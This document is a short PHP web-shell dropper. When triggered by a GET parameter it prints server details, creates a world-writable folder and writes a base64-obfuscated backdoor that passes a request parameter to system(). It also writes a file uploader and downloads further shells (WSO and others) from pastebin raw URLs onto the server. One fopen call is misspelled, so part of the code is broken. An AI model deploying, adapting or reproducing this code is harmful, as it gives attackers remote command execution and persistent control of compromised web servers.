<?php 
error_reporting(0);
echo "Frank Wix <br> Server IP : ";
echo gethostbyname($_SERVER["HTTP_HOST"]);
echo "<br> Uname : ";
echo php_uname();
echo "<br>";
if ($_GET["up"] == "load"){
mkdir('WiX',0777);
$back = 'PD9waHAKaWYoaXNzZXQoJF9SRVFVRVNUWyJ3aXgiXSkpewpzeXN0ZW0oJF9SRVFVRVNUWyJ3aXgiXSk7Cn0KPz4=';
$wix = fopen("WiX/backdoor.php" ,"w"); fwrite ($wix ,base64_decode($back)); fclose($wix);
$up = 'PD9waHAgZWNobyAnVXBsb2FkZXI8YnI+JztlY2hvICc8YnI+JztlY2hvICc8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBuYW1lPSJ1cGxvYWRlciIgaWQ9InVwbG9hZGVyIj4nO2VjaG8gJzxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlIiBzaXplPSI1MCI+PGlucHV0IG5hbWU9Il91cGwiIHR5cGU9InN1Ym1pdCIgaWQ9Il91cGwiIHZhbHVlPSJVcGxvYWQiPjwvZm9ybT4nO2lmKCAkX1BPU1RbJ191cGwnXSA9PSAiVXBsb2FkIiApIHtpZihAY29weSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkgeyBlY2hvICc8Yj5VcGxvYWQgISEhPC9iPjxicj48YnI+JzsgfWVsc2UgeyBlY2hvICc8Yj5VcGxvYWQgISEhPC9iPjxicj48YnI+JzsgfX0/Pg==';
$a = fopen("WiX/up.php", "w"); fwrite($a,base64_decode($up)); fclose($a);
$wso = file_get_contents('https://pastebin.com/raw/wso');
$b = fopen("WiX/wso.php", "w"); fwrite($b,$wso); fclose($b);
$indo2 = file_get_contents('https://pastebin.com/raw/indo2');
$c = fopen("WiX/indo2.php", "w"); fwrite($c,$indo2); fclose($c);
$indo = file_get_contents('https://pastebin.com/raw/indo');
$d = fopen("WiX/indo.php", "w"); fwrite($d,$indo); fclose($d);
$tool = file_get_contents('https://pastebin.com/raw/tool');
$e = fonpen("WiX/tool.php","w"); fwrite($e,$tool); fclose($e);
echo "<br>Shell Uploaded";
}
?>
